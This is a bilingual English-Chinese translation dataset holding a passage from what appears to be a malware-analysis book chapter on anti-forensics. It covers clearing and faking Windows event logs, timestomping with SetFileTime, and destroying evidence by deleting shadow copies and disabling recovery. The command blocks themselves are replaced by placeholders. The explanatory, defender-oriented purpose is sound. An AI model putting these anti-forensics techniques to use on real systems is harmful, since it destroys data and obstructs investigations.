- en: '| <samp class="SANS_Futura_Std_Book_11">4946</samp> | <samp class="SANS_Futura_Std_Book_11">A
    Windows firewall rule was added.</samp> |'
  id: totrans-251
  prefs: []
  type: TYPE_TB
  zh: '| <samp class="SANS_Futura_Std_Book_11">4946</samp> | <samp class="SANS_Futura_Std_Book_11">添加了一个
    Windows 防火墙规则。</samp> |'
- en: '| <samp class="SANS_Futura_Std_Book_11">5140</samp> | <samp class="SANS_Futura_Std_Book_11">A
    network share was accessed. Information such as the user’s account and IP address
    is logged, as well as what type of access permissions the user requested (such
    as Read or Write).</samp> |'
  id: totrans-252
  prefs: []
  type: TYPE_TB
  zh: '| <samp class="SANS_Futura_Std_Book_11">5140</samp> | <samp class="SANS_Futura_Std_Book_11">访问了网络共享。日志记录了用户的账户信息、IP
    地址以及用户请求的访问权限类型（例如读取或写入）。</samp> |'
- en: '| <samp class="SANS_Futura_Std_Book_11">7045</samp> | <samp class="SANS_Futura_Std_Book_11">A
    service was installed on the system. The log records information such as the service’s
    name and image path (for example, its executable on disk).</samp> |'
  id: totrans-253
  prefs: []
  type: TYPE_TB
  zh: '| <samp class="SANS_Futura_Std_Book_11">7045</samp> | <samp class="SANS_Futura_Std_Book_11">系统上安装了一个服务。日志记录了如服务名称和图像路径（例如其磁盘上的可执行文件）等信息。</samp>
    |'
- en: Since logs of these events can be valuable to a forensics investigator, it makes
    sense that clearing or tampering with these event logs can in turn be valuable
    for a malware author.
  id: totrans-254
  prefs: []
  type: TYPE_NORMAL
  zh: 由于这些事件的日志对取证调查人员来说非常有价值，因此清除或篡改这些事件日志对于恶意软件作者来说也具有价值。
- en: 'One of the simplest methods of tampering with logs is simply deleting, or clearing,
    them. To clear these event logs, malware can invoke the Windows utility Wevtutil.
    The following commands will wipe the system, application, and security event logs,
    respectively, on the victim system:'
  id: totrans-255
  prefs: []
  type: TYPE_NORMAL
  zh: 篡改日志的最简单方法之一就是直接删除或清除它们。为了清除这些事件日志，恶意软件可以调用 Windows 工具 Wevtutil。以下命令分别将清除受害系统上的系统、应用程序和安全事件日志：
- en: '[PRE32]'
  id: totrans-256
  prefs: []
  type: TYPE_PRE
  zh: '[PRE32]'
- en: 'Or the malware can use a PowerShell command, such as this:'
  id: totrans-257
  prefs: []
  type: TYPE_NORMAL
  zh: 或者，恶意软件可以使用 PowerShell 命令，例如以下命令：
- en: '[PRE33]'
  id: totrans-258
  prefs: []
  type: TYPE_PRE
  zh: '[PRE33]'
- en: This command scrubs all Windows security event logs.
  id: totrans-259
  prefs: []
  type: TYPE_NORMAL
  zh: 该命令清除所有 Windows 安全事件日志。
- en: 'Malware can even disable event logging completely during an attack by invoking
    PowerShell to stop the Windows Event Logging service, like so:'
  id: totrans-260
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件甚至可以在攻击期间通过调用 PowerShell 停止 Windows 事件日志服务，完全禁用事件日志，如下所示：
- en: '[PRE34]'
  id: totrans-261
  prefs: []
  type: TYPE_PRE
  zh: '[PRE34]'
- en: 'Keep in mind that deleting logfiles or stopping logging can be quite noisy,
    especially if the victim organization is specifically monitoring for log-tampering
    techniques. Another approach is manually writing new Windows event logs to throw
    off investigators. By creating an event for a fictitious login or for the deletion
    or creation of an imaginary file, for example, the malware author can create a
    “red herring” scenario. They can accomplish this with the PowerShell cmdlet <samp
    class="SANS_TheSansMonoCd_W5Regular_11">Write-EventLog</samp>:'
  id: totrans-262
  prefs: []
  type: TYPE_NORMAL
  zh: 请记住，删除日志文件或停止日志记录可能会引起很大的注意，尤其是当受害组织特别监控日志篡改技术时。另一种方法是手动写入新的 Windows 事件日志，以迷惑调查人员。例如，通过为虚构的登录事件或删除或创建虚拟文件创建事件，恶意软件作者可以制造“烟雾弹”场景。他们可以通过
    PowerShell cmdlet <samp class="SANS_TheSansMonoCd_W5Regular_11">Write-EventLog</samp>
    来实现这一点：
- en: '[PRE35]'
  id: totrans-263
  prefs: []
  type: TYPE_PRE
  zh: '[PRE35]'
- en: 'Windows events are stored as *.evtx* files inside the *C:\Windows\System32\winevt\Logs*
    directory. You can see an example directory listing in the following output:'
  id: totrans-264
  prefs: []
  type: TYPE_NORMAL
  zh: Windows 事件存储为 *.evtx* 文件，位于 *C:\Windows\System32\winevt\Logs* 目录下。你可以在以下输出中看到示例目录列表：
- en: '[PRE36]'
  id: totrans-265
  prefs: []
  type: TYPE_PRE
  zh: '[PRE36]'
- en: 'Each *.evtx* file in this output represents a certain type of logging event,
    such as application events, hardware events, and Internet Explorer events. You
    may spot malware specifically referencing this directory location in its code.
    This can be a telltale sign that the malware is attempting to tamper with these
    files, such as in the following code:'
  id: totrans-266
  prefs: []
  type: TYPE_NORMAL
  zh: 输出中的每个 *.evtx* 文件表示一种特定类型的日志事件，例如应用程序事件、硬件事件和 Internet Explorer 事件。你可能会在恶意软件的代码中发现它特别引用了此目录位置。这可能是一个明显的迹象，表明恶意软件正在尝试篡改这些文件，例如以下代码：
- en: '[PRE37]'
  id: totrans-267
  prefs: []
  type: TYPE_PRE
  zh: '[PRE37]'
- en: This malware code references the path *C:\Windows\System32\winevt\Logs* ❶ and
    then calls a function that encrypts this data (which I have named <samp class="SANS_TheSansMonoCd_W5Regular_11">encrypt_data</samp>)
    ❷, effectively destroying these files.
  id: totrans-268
  prefs: []
  type: TYPE_NORMAL
  zh: 该恶意代码引用了路径 *C:\Windows\System32\winevt\Logs* ❶，然后调用一个加密此数据的函数（我命名为 <samp class="SANS_TheSansMonoCd_W5Regular_11">encrypt_data</samp>）
    ❷，从而有效地销毁这些文件。
- en: 'Furthermore, malware may be able to directly modify *.evtx* files to hide malicious
    activity. This can be a delicate process, and it involves shutting down the event-logging
    services, tampering with the event files, and recalculating a checksum that serves
    as a sort of integrity check. This technique is outside the scope of this book,
    but you can read more about it in the *Medium* blog post “Event Log Tampering
    Part 2: Manipulating Individual Event Logs,” at [*https://<wbr>svch0st<wbr>.medium<wbr>.com<wbr>/event<wbr>-log<wbr>-tampering<wbr>-part<wbr>-2<wbr>-manipulating<wbr>-individual<wbr>-event<wbr>-logs<wbr>-3de37f7e3a85*](https://svch0st.medium.com/event-log-tampering-part-2-manipulating-individual-event-logs-3de37f7e3a85).'
  id: totrans-269
  prefs: []
  type: TYPE_NORMAL
- en: <samp class="SANS_Dogma_OT_Bold_B_15">NOTE</samp>
  id: totrans-270
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '*While I was writing this book, Kaspersky reported on a malware variant that
    writes malicious code into Windows event logs and executes the code in memory
    directly from the logs themselves. This technique combines event log tampering
    techniques with memory-resident techniques. You can read more about this in Denis
    Legezo’s post “A New Secret Stash for ‘Fileless’ Malware” on the Kaspersky blog
    at* [https://securelist.com/a-new-secret-stash-for-fileless-malware/106393/](https://securelist.com/a-new-secret-stash-for-fileless-malware/106393/).'
  id: totrans-271
  prefs: []
  type: TYPE_NORMAL
- en: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">Timestomping</samp>
  id: totrans-272
  prefs:
  - PREF_H5
  type: TYPE_NORMAL
- en: '*Timestomping* is a technique used to mislead forensics investigators by modifying
    file timestamps. In the NTFS (the default filesystem in modern versions of Windows),
    a timestamp is represented as a 64-bit integer (more formally called a *filetime
    structure*) that equates to the number of 100-nanosecond intervals, or ticks,
    since January 1, 1601, UTC time. This sounds quite complicated, but the important
    thing to know is that, when converted to a human-readable format, this integer
    represents a specific date and time. For example, the timestamp integer <samp
    class="SANS_TheSansMonoCd_W5Regular_11">133346988430000000</samp> can be converted
    to the human-readable string of <samp class="SANS_TheSansMonoCd_W5Regular_11">Monday,
    July 24, 2023 7:00:43 PM</samp>. Internally, Windows uses the function <samp class="SANS_TheSansMonoCd_W5Regular_11">FileTimeToSystemTime</samp>
    to make this conversion. The NTFS format keeps track of file and directory timestamps
    for when a file or directory is written to or otherwise modified, accessed (opened
    and read), or created (or copied, moved, and so on), as well as when a file or
    directory’s metadata has changed. Metadata can include the file or directory’s
    name, attributes, permissions, and other data. You can read more about the filetime
    structure format here: [*https://<wbr>www<wbr>.ntfs<wbr>.com<wbr>/exfat<wbr>-time<wbr>-stamp<wbr>.htm*](https://www.ntfs.com/exfat-time-stamp.htm).'
  id: totrans-273
  prefs: []
  type: TYPE_NORMAL
- en: 'To modify these filetime timestamps in an effort to mislead investigators,
    malware can use a WinAPI function designed specifically for this use case: <samp
    class="SANS_TheSansMonoCd_W5Regular_11">SetFileTime</samp>. The <samp class="SANS_TheSansMonoCd_W5Regular_11">SetFileTime</samp>
    function accepts three parameters: the file creation time (<samp class="SANS_TheSansMonoCd_W5Regular_11">lpCreationTime</samp>),
    the last access time (<samp class="SANS_TheSansMonoCd_W5Regular_11">lpLastAccessTime</samp>),
    and the last modified time (<samp class="SANS_TheSansMonoCd_W5Regular_11">lpLastWriteTime</samp>).
    Malware can use the functions <samp class="SANS_TheSansMonoCd_W5Regular_11">SetFileInformationByHandle</samp>
    and <samp class="SANS_TheSansMonoCd_W5Regular_11">NtSetInformationFile</samp>
    similarly to tamper with either its own timestamps or those of other files and
    directories.'
  id: totrans-274
  prefs: []
  type: TYPE_NORMAL
  zh: 为了修改这些文件时间戳，以误导调查人员，恶意软件可以使用专门为此用途设计的 WinAPI 函数：<samp class="SANS_TheSansMonoCd_W5Regular_11">SetFileTime</samp>。<samp
    class="SANS_TheSansMonoCd_W5Regular_11">SetFileTime</samp> 函数接受三个参数：文件创建时间（<samp
    class="SANS_TheSansMonoCd_W5Regular_11">lpCreationTime</samp>）、最后访问时间（<samp class="SANS_TheSansMonoCd_W5Regular_11">lpLastAccessTime</samp>）和最后修改时间（<samp
    class="SANS_TheSansMonoCd_W5Regular_11">lpLastWriteTime</samp>）。恶意软件可以使用函数 <samp
    class="SANS_TheSansMonoCd_W5Regular_11">SetFileInformationByHandle</samp> 和 <samp
    class="SANS_TheSansMonoCd_W5Regular_11">NtSetInformationFile</samp> 以类似的方式篡改自身或其他文件和目录的时间戳。
- en: During the forensics investigation process, it is very common for investigators
    to create a timeline of all filesystem events. File timestamp metadata and logs
    are often part of these timelines. If malware employs timestomping and log tampering
    techniques, this investigation timeline will be inaccurate, causing a delay in
    the investigation process at best and an unresolved case at worst. For forensics
    investigations that must be defended in court, the consequences can be especially
    severe.
  id: totrans-275
  prefs: []
  type: TYPE_NORMAL
  zh: 在取证调查过程中，调查人员通常会创建一个所有文件系统事件的时间线。文件的时间戳元数据和日志通常是这些时间线的一部分。如果恶意软件采用了时间戳篡改和日志篡改技术，这个调查时间线将不准确，至少会导致调查过程延迟，最糟糕的情况是案件无法解决。对于那些必须在法庭上辩护的取证调查，后果可能特别严重。
- en: <samp class="SANS_Futura_Std_Bold_Condensed_Oblique_I_11">Destroying the System</samp>
  id: totrans-276
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Bold_Condensed_Oblique_I_11">销毁系统</samp>
- en: Perhaps the most permanent and destructive technique for hiding evidence is
    total system destruction. You might be wondering why an attacker would wish to
    destroy a system to cover up evidence, as this would surely alert the victim user
    or organization to the attack. While this is true, it’s still the most permanent
    and absolute method of covering up evidence of an attack. If the system is destroyed,
    there’s a good chance it will put a halt to the investigation. This is also a
    way to avoid attribution of the attack.
  id: totrans-277
  prefs: []
  type: TYPE_NORMAL
  zh: 也许最永久且具有破坏性的隐藏证据技术是彻底销毁系统。你可能会想知道，攻击者为什么要销毁一个系统来掩盖证据，因为这无疑会引起受害者或组织对攻击的警觉。虽然这是真的，但它仍然是掩盖攻击证据最永久和最绝对的方法。如果系统被销毁，调查很有可能会停止。这也是避免追溯攻击来源的一种方式。
- en: To destroy evidence of the attack, the malware could encrypt the entire disk
    and the master boot record (MBR), rendering the system unbootable, similar to
    how some ransomware operates. The primary difference here is that the attacker
    would destroy the encryption and decryption keys, as they’re not required anymore.
    Or the malware could overwrite sections of the disk with random data to achieve
    a similar effect.
  id: totrans-278
  prefs: []
  type: TYPE_NORMAL
  zh: 为了销毁攻击的证据，恶意软件可以加密整个磁盘和主引导记录（MBR），使系统无法启动，这类似于一些勒索软件的操作。这里的主要区别是攻击者会销毁加密和解密密钥，因为这些密钥不再需要。或者，恶意软件可以用随机数据覆盖磁盘的某些部分，以实现类似的效果。
- en: 'The malware could also disable utilities that would otherwise allow investigators
    to recover the system, such as Windows Startup Repair, or delete all backups.
    These are some of the commands it might run as a precursor to a destructive attack:'
  id: totrans-279
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件还可以禁用本应允许调查人员恢复系统的工具，如 Windows 启动修复，或删除所有备份。这些是它可能作为破坏性攻击前奏运行的一些命令：
- en: '[PRE38]'
  id: totrans-280
  prefs: []
  type: TYPE_PRE
  zh: '[PRE38]'
- en: The first command deletes all volume shadow copies, a backup feature in Windows
    that allows copies of files to be restored. Deleting these backups prevents investigators
    from retrieving evidence stored as shadow copies. The second and third commands
    prevent Windows from booting into recovery mode, which is an approach sometimes
    used by investigators or system administrators to recover the system.
  id: totrans-281
  prefs: []
  type: TYPE_NORMAL
  zh: 第一个命令删除所有的卷影副本，卷影副本是 Windows 中的一种备份功能，可以恢复文件的副本。删除这些备份会阻止调查人员恢复存储为卷影副本的证据。第二个和第三个命令则防止
    Windows 启动到恢复模式，这是调查人员或系统管理员有时用来恢复系统的一种方法。
- en: Complete system destruction for the sole purpose of anti-forensics is rare.
    It’s much more common for malware to have a primary goal of destroying systems
    and data for the purpose of service disruption, with anti-forensics only as a
    secondary goal. For example, the malware family Shamoon destroyed data on the
    target systems, which, as a by-product, may have hindered investigation efforts.
    HermeticWiper (briefly covered in [Chapter 14](chapter14.xhtml)) is another example.
  id: totrans-282
  prefs: []
  type: TYPE_NORMAL
  zh: 完全摧毁系统仅仅为了反取证目的的情况比较少见。恶意软件更常见的做法是主要目的是摧毁系统和数据，从而导致服务中断，反取证只是次要目标。例如，恶意软件家族
    Shamoon 删除了目标系统上的数据，作为副产品，这可能会妨碍调查工作。HermeticWiper（在[第14章](chapter14.xhtml)中简要介绍）是另一个例子。
- en: <samp class="SANS_Futura_Std_Bold_B_11">Summary</samp>
  id: totrans-283
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Bold_B_11">总结</samp>
- en: In this chapter, you saw how fileless attacks work and how malware authors leverage
    memory- and registry-resident malware to achieve their goal without leaving obvious
    evidence behind. You also learned how threat actors can abuse native and signed
    Windows binaries (LOLBins) to covertly execute malicious code in order to bypass
    security controls such as AppLocker or support fileless attacks. We then delved
    deeper into the topic of hiding evidence by exploring some anti-forensics techniques
    that malware employs to cover its tracks and further impede investigation efforts.
    In the next chapter, we’ll dive into how malware evades detection using encoding
    and encryption.
  id: totrans-284
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，你了解了无文件攻击的原理以及恶意软件作者如何利用驻留在内存和注册表中的恶意软件达到目的，而不留下明显的证据。你还学会了威胁行为者如何滥用原生的、签名的
    Windows 二进制文件（LOLBins）来隐秘地执行恶意代码，以绕过如 AppLocker 这样的安全控制，或支持无文件攻击。随后，我们深入探讨了隐藏证据的话题，探索了恶意软件使用的一些反取证技术，帮助其掩盖痕迹并进一步阻碍调查工作。在下一章中，我们将深入探讨恶意软件如何通过编码和加密来避开检测。
